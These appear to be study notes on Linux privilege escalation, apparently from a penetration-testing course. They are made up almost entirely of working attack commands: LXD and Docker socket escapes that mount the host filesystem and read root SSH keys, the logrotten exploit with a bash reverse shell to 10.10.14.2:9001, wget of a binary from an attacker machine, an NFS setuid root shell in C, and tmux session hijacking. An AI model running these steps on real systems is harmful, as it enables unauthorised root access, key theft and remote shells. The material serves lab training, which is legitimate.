# Linux Containers
`LXC` = Linux Containers
```bash
id

uid=1000(container-user) gid=1000(container-user) groups=1000(container-user),116(lxd)
```

```bash
cd ContainerImages
ls

lxc image import ubuntu-template.tar.xz --alias ubuntutemp
lxc image list
lxc init ubuntutemp privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
lxc start privesc
lxc exec privesc /bin/bash
ls -l /mnt/root
```

# Docker
```bash
cd /hostsystem/home/cry0l1t3
cat .ssh/id_rsa

ssh cry0l1t3@<host IP> -i cry0l1t3.priv
ls -al ~/app

cd /tmp
wget https://<parrot-os>:443/docker -O docker
chmod +x docker
ls -l
/tmp/docker -H unix:///app/docker.sock ps

cd /app
/tmp/docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app
/tmp/docker -H unix:///app/docker.sock ps
# gotting the ID from the command.

/tmp/docker -H unix:///app/docker.sock exec -it 7ae3bcc818af /bin/bash
cat /hostsystem/root/.ssh/id_rsa

# Seeing what image exist
docker image ls
docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash
```
#### Mini Exercise
```bash
id
docker image ls

ubuntu

docker run --rm -it -v /:/mnt ubuntu chroot /mnt bash
```

# Logrotate
```bash
man logrotate
# or
logrotate --help

# Checking out the configurations
cat /etc/logrotate.conf
sudo cat /var/lib/logrotate.status
ls /etc/logrotate.d/
cat /etc/logrotate.d/dpkg
```
To exploit `logrotate`, we need some requirements that we have to fulfill.
1. we need `write` permissions on the log files
2. logrotate must run as a privileged user or `root`
3. vulnerable versions:
    - 3.8.6
    - 3.11.0
    - 3.15.0
    - 3.18.0
There is a prefabricated exploit that we can use for this if the requirements are met. This exploit is named [logrotten](https://github.com/whotwagner/logrotten). We can download and compile it on a similar kernel of the target system and then transfer it to the target system. Alternatively, if we can compile the code on the target system, then we can do it directly on the target system.
#### The Exploit
```bash
git clone https://github.com/whotwagner/logrotten.git
cd logrotten
gcc logrotten.c -o logrotten

# The payload
echo 'bash -i >& /dev/tcp/10.10.14.2/9001 0>&1' > payload
grep "create\|compress" /etc/logrotate.conf | grep -v "#"

# The attack
nc -nlvp 9001
./logrotten -p ./payload /tmp/tmp.log
```

# Other Methods
If `tcpdump` is installed, unprivileged users may be able to capture network traffic, including, in some cases, credentials passed in cleartext. Several tools exist, such as [net-creds](https://github.com/DanMcInerney/net-creds) and [PCredz](https://github.com/lgandx/PCredz) that can be used to examine data being passed on the wire. This may result in capturing sensitive information such as credit card numbers and SNMP community strings. It may also be possible to capture Net-NTLMv2, SMBv2, or Kerberos hashes, which could be subjected to an offline brute force attack to reveal the plaintext password. Cleartext protocols such as HTTP, FTP, POP, IMAP, telnet, or SMTP may contain credentials that could be reused to escalate privileges on the host.

```bash
showmount -e 10.129.2.12
cat /etc/exports
```

```bash
cd /tmp
cat shell.c 

#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>

int main(void)
{
  setuid(0); setgid(0); system("/bin/bash");
}

gcc shell.c -o shell
sudo mount -t nfs 10.129.2.12:/tmp /mnt
cp shell /mnt
chmod u+s /mnt/shell
ls -la
./shell
```

#### Hijacking Tmux Sessions
```bash
tmux -S /shareds new -s debugsess
chown root:devs /shareds

ps aux | grep tmux
ls -la /shareds
id
tmux -S /shareds

```